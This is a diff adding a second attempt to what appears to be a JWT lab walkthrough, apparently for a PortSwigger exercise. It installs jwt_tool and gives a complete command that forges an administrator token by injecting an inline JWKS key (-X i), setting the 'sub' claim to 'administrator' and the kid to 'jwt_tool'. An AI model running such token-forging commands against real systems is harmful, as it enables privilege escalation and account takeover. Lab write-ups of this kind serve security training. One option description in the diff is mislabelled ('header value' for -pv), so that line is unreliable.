@@ -28,6 +28,49 @@ Forged token:
 
 click send to check out if token is valid.
 
+# attempt 2 - using jwt_tool 
+First of all I installed this tools using commands:
+`sudo apt update && sudo apt install python3 python3-pip
+git clone https://github.com/ticarpi/jwt_tool.git
+cd jwt_tool
+pip3 install -r requirements.txt
+`
+to run the jwt_tool : `python3 jwt_tool.py -h`
+
+There is some useful option in jwt_tool: 
+![image](https://github.com/user-attachments/assets/86a586f4-65ca-48bf-bfc1-3acba5f3bf5f)
+(-X (exploit) with i parameter (inject inline JWKS))
+
+command to get valid token: 
+`python3 jwt_tool.py eyJraWQiOiIxYWZhMmYzOC1hYmQzLTQ0YWYtYjYxNi01MTg3YjJlNDExNzAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MzUzMDg3Miwic3ViIjoid2llbmVyIn0.t2JHJdHjvOiMrVx0fUMt_SPIjX-e-KlBrEqFNj0Pv8LnMlXRlCkQxAMzkvDN5IND9_JADwSNlNcpLOjvUdAQTPC57lOpWy26Jyem9FevrXzD-KqhC-r9zKdbuearXs0mvE4FZyK3KtYnrDHwzPtgw4zHdribvqaGiz-Q9MG051ZuWsoZK5Eq98Z1GBLPWkgdw6QCfmtYZLzWHZW3QZ22haio6KhpzsU7c5h27RF4jE-npz8OxnaeslDX8PAly45TEC6zZ613TiIvzZ_NtFSNoPNaCeY0_cUp5ytcFCYAzkXWNlgQ8igB6tcGHErT22WXAtqyVScuuINqE50uVYBKQg -I -pc sub -pv administrator -hc kid -hv jwt_tool -X i`
+
+-hc option says header claim 
+-hv options says header value
+-pc option says payload claim
+-pv option says header value
+
+remember to use jwt_tool as kid parameter because these parameter is used in couple of places.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
